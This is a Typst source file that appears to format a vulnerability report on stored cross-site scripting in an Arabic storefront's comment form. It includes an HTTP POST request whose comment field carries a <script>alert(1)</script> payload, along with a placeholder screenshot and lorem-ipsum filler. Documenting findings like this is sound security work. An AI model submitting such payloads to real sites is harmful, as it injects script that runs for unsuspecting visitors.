#set page(paper: "us-letter", margin: 1in)
#set text(font: ("Libertinus Serif", "Noto Naskh Arabic"), size: 11pt)
#show raw: set text(font: ("DejaVu Sans Mono", "Noto Naskh Arabic"))
#show raw.where(block: true): block.with(fill: luma(240), inset: 8pt, radius: 3pt, width: 100%)

= Stored cross-site scripting in the comment form

The comment field of the Arabic storefront accepts markup. The request below
stores a comment that runs script for every visitor who opens the product page.

```http
POST /ar/products/88/comments HTTP/1.1
Host: shop.example
Content-Type: application/x-www-form-urlencoded

comment=مرحبا بالعالم<script>alert(1)</script>
```

#figure(
  rect(width: 70%, height: 3cm, fill: luma(230))[#align(center + horizon)[screenshot]],
  caption: [The product page after the payload runs: #text(lang: "ar")[صفحة المنتج بعد تنفيذ الشيفرة]],
)

#lorem(80)
